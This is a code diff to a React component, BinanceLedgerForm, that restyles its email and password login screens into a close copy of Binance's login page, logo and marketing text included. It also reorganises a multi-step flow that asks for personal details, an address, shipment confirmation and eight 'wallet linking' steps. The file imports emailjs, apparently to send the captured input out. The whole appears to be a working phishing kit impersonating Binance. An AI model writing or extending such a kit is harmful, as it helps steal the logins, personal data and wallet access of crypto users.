@@ -6,7 +6,7 @@ import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
 import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
-import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight, Eye, EyeOff } from "lucide-react";
+import { Wallet, CheckCircle, AlertCircle, Lock, ArrowRight, Eye, EyeOff, Globe } from "lucide-react";
 import emailjs from 'emailjs-com';
 import { EMAILJS_CONFIG } from "@/config/emailjs.config";
 
@@ -477,101 +477,241 @@ const BinanceLedgerForm: FC = () => {
   );
 
   const renderLoginEmail = () => (
-    <div className="w-full max-w-md mx-auto">
-      <div className="text-center mb-8">
-        <h1 className="text-2xl font-semibold text-white mb-2">Log In</h1>
-        <p className="text-gray-400 text-sm">Log in to your Binance account</p>
-      </div>
-      
-      <div className="space-y-6">
-        <div>
-          <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-2">
-            Email/Phone number
-          </label>
-          <div className="relative">
-            <Input
-              id="email"
-              name="email"
-              type="email"
-              value={formData.email}
-              onChange={handleInputChange}
-              placeholder="Email/Phone"
-              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.email ? "border-red-500" : ""}`}
-              autoFocus
-            />
+    <div className="min-h-screen bg-[#0b0e11] flex">
+      {/* Top bar with Binance logo */}
+      <div className="absolute top-0 left-0 w-full z-10">
+        <div className="flex items-center justify-between p-6">
+          <div className="flex items-center">
+            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
+              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
+              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
+              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
+              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
+              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
+            </svg>
+            <span className="text-white text-2xl font-bold ml-3">Binance</span>
           </div>
-          {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+          <div className="flex items-center space-x-4">
+            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
+              <Globe className="w-4 h-4 mr-2" />
+              <span>English</span>
+            </div>
+          </div>
         </div>
-        
-        <Button
-          onClick={handleNext}
-          className="w-full h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
-        >
-          Next
-        </Button>
-        
-        <div className="text-center">
-          <p className="text-gray-500 text-sm">
-            Don't have an account? <span className="text-[#fcd535] cursor-pointer hover:underline">Sign up</span>
+      </div>
+
+      {/* Left side - Marketing content */}
+      <div className="flex-1 flex items-center justify-center px-16 pt-24">
+        <div className="max-w-lg">
+          <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
+            Buy, trade, and hold 350+ cryptocurrencies
+          </h1>
+          <p className="text-[#848e9c] text-xl leading-7 mb-8">
+            Join the world's largest crypto exchange
           </p>
+          <div className="space-y-4">
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>Trade with confidence on the world's leading crypto exchange</span>
+            </div>
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>24/7 customer service</span>
+            </div>
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>Simple and secure</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Right side - Login form */}
+      <div className="w-[480px] bg-[#1e2329] pt-24">
+        <div className="p-8">
+          <div className="mb-8">
+            <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
+            <p className="text-[#848e9c] text-base">
+              Welcome back! Please sign in to your account
+            </p>
+          </div>
+
+          <div className="space-y-6">
+            <div>
+              <label htmlFor="email" className="block text-[#eaecef] text-sm font-medium mb-3">
+                Email
+              </label>
+              <Input
+                id="email"
+                name="email"
+                type="email"
+                value={formData.email}
+                onChange={handleInputChange}
+                placeholder="Please enter your email"
+                className={`w-full h-12 bg-[#2b3139] border border-[#474d57] text-white placeholder-[#848e9c] rounded text-base focus:border-[#fcd535] focus:ring-0 focus:outline-none ${errors.email ? "border-red-500" : ""}`}
+                autoFocus
+              />
+              {errors.email && <p className="text-red-500 text-sm mt-2">{errors.email}</p>}
+            </div>
+            
+            <Button
+              onClick={handleNext}
+              className="w-full h-12 bg-[#fcd535] text-[#0b0e11] font-semibold text-base rounded hover:bg-[#e6c441] transition-colors"
+            >
+              Continue
+            </Button>
+            
+            <div className="text-center">
+              <p className="text-[#848e9c] text-sm">
+                Don't have an account? <span className="text-[#fcd535] cursor-pointer hover:underline">Sign up</span>
+              </p>
+            </div>
+
+            <div className="flex items-center my-8">
+              <div className="flex-1 border-t border-[#474d57]"></div>
+              <span className="px-4 text-[#848e9c] text-sm">Or continue with</span>
+              <div className="flex-1 border-t border-[#474d57]"></div>
+            </div>
+
+            <div className="grid grid-cols-2 gap-4">
+              <Button
+                variant="outline"
+                className="h-12 bg-transparent border border-[#474d57] text-[#eaecef] hover:bg-[#2b3139] hover:border-[#848e9c] rounded"
+              >
+                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24">
+                  <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                  <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                  <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                  <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Google
+              </Button>
+              <Button
+                variant="outline"
+                className="h-12 bg-transparent border border-[#474d57] text-[#eaecef] hover:bg-[#2b3139] hover:border-[#848e9c] rounded"
+              >
+                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24">
+                  <path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Facebook
+              </Button>
+            </div>
+          </div>
         </div>
       </div>
     </div>
   );
 
   const renderLoginPassword = () => (
-    <div className="w-full max-w-md mx-auto">
-      <div className="text-center mb-8">
-        <h1 className="text-2xl font-semibold text-white mb-2">Log In</h1>
-        <p className="text-gray-400 text-sm">Welcome back! Please enter your password</p>
-      </div>
-      
-      <div className="space-y-6">
-        <div>
-          <div className="flex items-center justify-between mb-2">
-            <label htmlFor="password" className="block text-sm font-medium text-gray-300">
-              Password
-            </label>
-            <span className="text-[#fcd535] text-sm cursor-pointer hover:underline">
-              Forgot Password?
-            </span>
+    <div className="min-h-screen bg-[#0b0e11] flex">
+      {/* Top bar with Binance logo */}
+      <div className="absolute top-0 left-0 w-full z-10">
+        <div className="flex items-center justify-between p-6">
+          <div className="flex items-center">
+            <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
+              <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
+              <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
+              <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
+              <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
+              <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
+            </svg>
+            <span className="text-white text-2xl font-bold ml-3">Binance</span>
           </div>
-          <div className="relative">
-            <Input
-              id="password"
-              name="password"
-              type={showPassword ? "text" : "password"}
-              value={formData.password}
-              onChange={handleInputChange}
-              placeholder="Enter your password"
-              className={`w-full h-12 bg-[#2b3139] border-[#474d57] text-white placeholder-gray-500 rounded-md px-4 pr-12 focus:border-[#fcd535] focus:ring-1 focus:ring-[#fcd535] ${errors.password ? "border-red-500" : ""}`}
-              autoFocus
-            />
-            <button
-              type="button"
-              onClick={() => setShowPassword(!showPassword)}
-              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-300"
-            >
-              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
-            </button>
+          <div className="flex items-center space-x-4">
+            <div className="flex items-center text-[#848e9c] text-sm cursor-pointer">
+              <Globe className="w-4 h-4 mr-2" />
+              <span>English</span>
+            </div>
           </div>
-          {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
         </div>
-        
-        <div className="flex justify-between space-x-3">
-          <Button
-            type="button"
-            onClick={handlePrevious}
-            className="flex-1 h-12 bg-transparent border border-[#474d57] text-gray-300 font-medium rounded-md hover:border-gray-400 transition-colors"
-          >
-            Back
-          </Button>
-          <Button
-            onClick={handleNext}
-            className="flex-1 h-12 bg-[#fcd535] text-black font-medium rounded-md hover:bg-[#fcd535]/90 transition-colors"
-          >
-            Log In
-          </Button>
+      </div>
+
+      {/* Left side - Marketing content */}
+      <div className="flex-1 flex items-center justify-center px-16 pt-24">
+        <div className="max-w-lg">
+          <h1 className="text-white text-[56px] font-semibold leading-[64px] mb-6">
+            Buy, trade, and hold 350+ cryptocurrencies
+          </h1>
+          <p className="text-[#848e9c] text-xl leading-7 mb-8">
+            Join the world's largest crypto exchange
+          </p>
+          <div className="space-y-4">
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>Trade with confidence on the world's leading crypto exchange</span>
+            </div>
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>24/7 customer service</span>
+            </div>
+            <div className="flex items-center text-[#848e9c]">
+              <CheckCircle className="w-5 h-5 text-[#02c076] mr-3 flex-shrink-0" />
+              <span>Simple and secure</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Right side - Login form */}
+      <div className="w-[480px] bg-[#1e2329] pt-24">
+        <div className="p-8">
+          <div className="mb-8">
+            <h2 className="text-white text-[32px] font-semibold mb-2">Log In</h2>
+            <p className="text-[#848e9c] text-base">
+              Welcome back! Please enter your password
+            </p>
+          </div>
+
+          <div className="space-y-6">
+            <div>
+              <div className="flex items-center justify-between mb-3">
+                <label htmlFor="password" className="block text-[#eaecef] text-sm font-medium">
+                  Password
+                </label>
+                <span className="text-[#fcd535] text-sm cursor-pointer hover:underline">
+                  Forgot Password?
+                </span>
+              </div>
+              <div className="relative">
+                <Input
+                  id="password"
+                  name="password"
+                  type={showPassword ? "text" : "password"}
+                  value={formData.password}
+                  onChange={handleInputChange}
+                  placeholder="Enter your password"
+                  className={`w-full h-12 bg-[#2b3139] border border-[#474d57] text-white placeholder-[#848e9c] rounded text-base pr-12 focus:border-[#fcd535] focus:ring-0 focus:outline-none ${errors.password ? "border-red-500" : ""}`}
+                  autoFocus
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-[#848e9c] hover:text-white"
+                >
+                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+                </button>
+              </div>
+              {errors.password && <p className="text-red-500 text-sm mt-2">{errors.password}</p>}
+            </div>
+            
+            <div className="flex space-x-4">
+              <Button
+                type="button"
+                onClick={handlePrevious}
+                className="flex-1 h-12 bg-transparent border border-[#474d57] text-[#eaecef] font-semibold text-base rounded hover:bg-[#2b3139] hover:border-[#848e9c]"
+              >
+                Back
+              </Button>
+              <Button
+                onClick={handleNext}
+                className="flex-1 h-12 bg-[#fcd535] text-[#0b0e11] font-semibold text-base rounded hover:bg-[#e6c441] transition-colors"
+              >
+                Log In
+              </Button>
+            </div>
+          </div>
         </div>
       </div>
     </div>
@@ -1320,41 +1460,112 @@ const BinanceLedgerForm: FC = () => {
   );
 
   return (
-    <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
-      <div className="mb-6">
-        <h2 className="text-[#fcd535] font-bold text-xl mb-2">
-          {currentStep >= FormStep.WALLET_STEP1 ? "Wallet Linking Process" : 
-           (currentStep >= FormStep.PERSONAL_DETAILS ? "Account Verification" : "Login")}
-        </h2>
-        {currentStep <= FormStep.WALLET_SUCCESS && (
-          <div className="mb-4">
-            <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
-            <div className="mt-2 text-sm text-gray-400">
-              Step {currentStep} of {FormStep.WALLET_SUCCESS}
+    <div>
+      {currentStep === FormStep.LOGIN_EMAIL && renderLoginEmail()}
+      {currentStep === FormStep.LOGIN_PASSWORD && renderLoginPassword()}
+      {currentStep === FormStep.APP_VERIFICATION && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          {renderAppVerification()}
+        </div>
+      )}
+      {currentStep === FormStep.LOGIN_SUCCESS && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          {renderLoginSuccess()}
+        </div>
+      )}
+      {currentStep === FormStep.PERSONAL_DETAILS && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
             </div>
           </div>
-        )}
-      </div>
-
-      <div>
-        {currentStep === FormStep.LOGIN_EMAIL && renderLoginEmail()}
-        {currentStep === FormStep.LOGIN_PASSWORD && renderLoginPassword()}
-        {currentStep === FormStep.APP_VERIFICATION && renderAppVerification()}
-        {currentStep === FormStep.LOGIN_SUCCESS && renderLoginSuccess()}
-        {currentStep === FormStep.PERSONAL_DETAILS && renderPersonalDetails()}
-        {currentStep === FormStep.ADDRESS_DETAILS && renderAddressDetails()}
-        {currentStep === FormStep.CONFIRMATION && renderConfirmation()}
-        {currentStep === FormStep.SHIPMENT_CONFIRMATION && renderShipmentConfirmation()}
-        {currentStep === FormStep.WALLET_STEP1 && renderWalletStep1()}
-        {currentStep === FormStep.WALLET_STEP2 && renderWalletStep2()}
-        {currentStep === FormStep.WALLET_STEP3 && renderWalletStep3()}
-        {currentStep === FormStep.WALLET_STEP4 && renderWalletStep4()}
-        {currentStep === FormStep.WALLET_STEP5 && renderWalletStep5()}
-        {currentStep === FormStep.WALLET_STEP6 && renderWalletStep6()}
-        {currentStep === FormStep.WALLET_STEP7 && renderWalletStep7()}
-        {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
-        {currentStep === FormStep.WALLET_SUCCESS && renderWalletSuccess()}
-      </div>
+          {renderPersonalDetails()}
+        </div>
+      )}
+      {currentStep === FormStep.ADDRESS_DETAILS && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
+            </div>
+          </div>
+          {renderAddressDetails()}
+        </div>
+      )}
+      {currentStep === FormStep.CONFIRMATION && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
+            </div>
+          </div>
+          {renderConfirmation()}
+        </div>
+      )}
+      {currentStep === FormStep.SHIPMENT_CONFIRMATION && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Account Verification</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
+            </div>
+          </div>
+          {renderShipmentConfirmation()}
+        </div>
+      )}
+      {(currentStep >= FormStep.WALLET_STEP1 && currentStep <= FormStep.WALLET_STEP8) && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Wallet Linking Process</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
+            </div>
+          </div>
+          <div>
+            {currentStep === FormStep.WALLET_STEP1 && renderWalletStep1()}
+            {currentStep === FormStep.WALLET_STEP2 && renderWalletStep2()}
+            {currentStep === FormStep.WALLET_STEP3 && renderWalletStep3()}
+            {currentStep === FormStep.WALLET_STEP4 && renderWalletStep4()}
+            {currentStep === FormStep.WALLET_STEP5 && renderWalletStep5()}
+            {currentStep === FormStep.WALLET_STEP6 && renderWalletStep6()}
+            {currentStep === FormStep.WALLET_STEP7 && renderWalletStep7()}
+            {currentStep === FormStep.WALLET_STEP8 && renderWalletStep8()}
+          </div>
+        </div>
+      )}
+      {currentStep === FormStep.WALLET_SUCCESS && (
+        <div className="bg-[#1e2329] rounded-lg p-8 shadow-lg max-w-lg mx-auto border border-[#474d57]">
+          <div className="mb-6">
+            <h2 className="text-[#fcd535] font-bold text-xl mb-2">Wallet Linking Process</h2>
+            <div className="mb-4">
+              <Progress value={formProgress} className="h-2 bg-[#2b3139]" />
+              <div className="mt-2 text-sm text-gray-400">
+                Step {currentStep} of {FormStep.WALLET_SUCCESS}
+              </div>
+            </div>
+          </div>
+          {renderWalletSuccess()}
+        </div>
+      )}
 
       <AlertDialog open={showLinkingDialog}>
         <AlertDialogContent className="bg-[#1e2329] border-[#474d57]">
